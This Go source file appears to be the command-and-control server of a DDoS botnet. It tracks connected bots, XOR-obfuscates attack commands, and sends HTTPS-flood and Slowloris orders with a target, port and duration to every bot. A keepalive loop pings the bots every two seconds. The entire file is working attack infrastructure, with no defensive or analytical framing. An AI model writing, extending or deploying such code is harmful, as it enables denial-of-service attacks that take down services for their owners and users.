package server

import (
	"fmt"
	"net"

	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
)

func GetBots() (int, string) {
	bots := []string{}
	for _, conn := range Conns {
		if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
			bots = append(bots, addr.IP.String()+":"+strconv.Itoa(addr.Port))
		}
	}
	return len(bots), strings.Join(bots, "\n")
}

func sendCmd(command_type string, target string, port string, duration string) {

	for _, conn := range Conns {
		var command string
		for _, i := range command_type + " " + target + " " + port + " " + duration {
			command += string(i ^ 3)
		}

		fmt.Println(command)
		_, err := conn.Write([]byte(command))

		if err != nil {
			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Error"))
			Conns = RemoveConn(Conns, conn)
			conn.Close()
		} else {
			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Command sent"))
		}
	}
}

func Https(target string, duration string, port string) {
	fmt.Println(target, port, duration)
	sendCmd("https", target, port, duration)

}

func Slowloris(target string, duration string, port string) {
	sendCmd("slowloris", target, port, duration)
}

func Ping() {
	for {
		for _, conn := range Conns {
			_, e := conn.Write([]byte("ping"))
			if e != nil {
				Conns = RemoveConn(Conns, conn)
				conn.Close()
			}
		}
		time.Sleep(2 * time.Second)
	}
}
